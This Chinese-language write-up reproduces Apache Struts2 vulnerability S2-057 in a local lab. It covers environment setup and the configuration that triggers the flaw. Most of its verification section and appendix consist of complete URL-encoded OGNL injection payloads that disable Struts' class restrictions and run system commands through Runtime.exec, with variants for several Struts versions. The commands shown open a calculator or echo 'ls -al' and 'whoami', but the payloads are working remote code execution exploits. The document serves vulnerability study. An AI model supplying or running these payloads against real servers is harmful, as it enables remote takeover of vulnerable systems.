## S2-057漏洞验证

### 1.环境搭建
1. 下载最新的受影响版本：http://archive.apache.org/dist/struts/  Struts2 2.3.34 
2. 漏洞介绍  
	该漏洞由安全研究员Man YueMo发现，在Struts2开发框架中使用namespace功能定义XML配置时，如果该值未被设置且上层动作配置（Action Configuration）中未配置或用通配符namespace，可能导致远程代码执行。同理，URL标签未设置value和action值且上层动作未设置或采用通配符namespace时，也可能导致远程代码执行。  
3. 通过业界的分析博客，由四种受影响的使用，在测试Demo中，仅仅验证触发了Redirect action、URL tag和postback result，而Action chain验证则失败，暂时未找到原因。  
	1. Redirect action 
	2. Action chain
	3. Postback result
	4. \<s:url includeParams="get"\>
4. 使用下载的Struts2，创建web工程，实现以上几处功能，见struts2目录中的代码

* 注意：在最初验证漏洞时，疏忽了一个配置项struts.mapper.alwaysSelectFullNamespace = true(是否总用最后一个斜线前的URL段作为namespace)，该值在默认版本中设置为false，只有手动的改为true，才能出发相关漏洞。  
	<img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/1.png" />	

### 2.漏洞验证

1. Location跳转，回显数值计算结果:${(1+1)}  %{(1+2)}  
	验证redirectAction: http://localhost:8080/struts2/snow/${(10+2)}/action1.action?username=redirect&password=helloworld
  <img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/2.png" />	  
  验证Postback：http://localhost:8080/struts2/%25{(10+2)}/action1.action?username=postback&password=helloworld  
	<img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/3.png" />  
	
  <img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/4.png" />
  
  验证URL TAG：http://localhost:8080/struts2/shadow/%25{(1+14)}/help.action  
  <img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/5.png" />
  
  验证Chain，显示代码未执行，失败！！  
  <img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/6.png" />
  
2. 验证弹出计算器
	http://localhost:8080/struts2/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20/Applications/Calculator.app%22%29%29%7D/action1.action?username=redirect&password=helloworld
  <img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/7.png" />
  
3. 执行命令回显
	http://localhost:8080/struts2/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27ls%20-al%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/action1.action?username=redirect&password=helloworld
  <img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/8.png" />
  
  http://localhost:8080/struts2/shadow/%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/help.action  
  <img src="https://github.com/shadow-horse/Learning-resource/blob/master/VulnerabilityAnalysis/S2-057/media/9.png" />



### 附记
其它版本POC：  
1. 2.3.20版本：  %24%7B%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C@java.lang.Runtime@getRuntime%28%29.exec%28%27calc.exe%27%29%7D
2. 2.3.34版本：  %24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23cmd%3D@java.lang.Runtime@getRuntime%28%29.exec%28%22calc%22%29%29%7D

3. 2.5.16版本：${(#ct=#request[‘struts.valueStack’].context).#cr=#ct[‘com.opensymphony.xwork2.ActionContext.container’]).(#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))}  
4. 2.3.16版本：$%7B(%23ct=%23request['struts.valueStack'].context).(%23cr=%23ct['com.opensymphony.xwork2.ActionContext.container']).(%23ou=%23cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(%23ou.setExcludedClasses('java.lang.Shutdown')).(%23ou.setExcludedPackageNames('sun.reflect.')).(%23dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(%23ct.setMemberAccess(%23dm)).(%23cmd=@java.lang.Runtime@getRuntime().exec('calc'))%7D

### 参考
https://xz.aliyun.com/t/2618  
https://github.com/Ivan1ee/struts2-057-exp  
https://lgtm.com/blog/apache_struts_CVE-2018-11776 
https://www.anquanke.com/post/id/157583  
https://otakekumi.github.io/2018/08/25/S2-057-%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E3%80%81%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%E5%8F%8AEXP%E6%9E%84%E9%80%A0/   
